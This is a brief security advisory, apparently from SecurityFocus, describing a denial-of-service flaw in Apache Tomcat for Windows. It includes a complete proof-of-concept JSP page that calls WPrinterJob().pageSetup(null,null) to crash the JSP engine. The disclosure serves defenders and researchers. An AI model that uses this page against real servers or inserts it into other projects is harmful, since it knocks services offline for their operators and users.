source: http://www.securityfocus.com/bid/4995/info

A vulnerability has been reported in Apache Tomcat for Windows that results in a denial of service condition. The vulnerability occurs when Tomcat encounters a malicious JSP page.

The following snippet of code is reported to crash the Tomcat JSP engine:
new WPrinterJob().pageSetup(null,null); 

<%@ page contentType="text/html;charset=UTF-8" pageEncoding="iso-8859-1"
%>
<%@ page import="sun.awt.windows.*" %>
<%! %>
<%
//
%>
<html>
<head>
<title>aa</title>
</head>
<body>

<p>
<FONT SIZE="+2">dON/T TR1 thiz @ home</font>
</p>
<%
new WPrinterJob().pageSetup(null,null);
%>

</body>
</html> 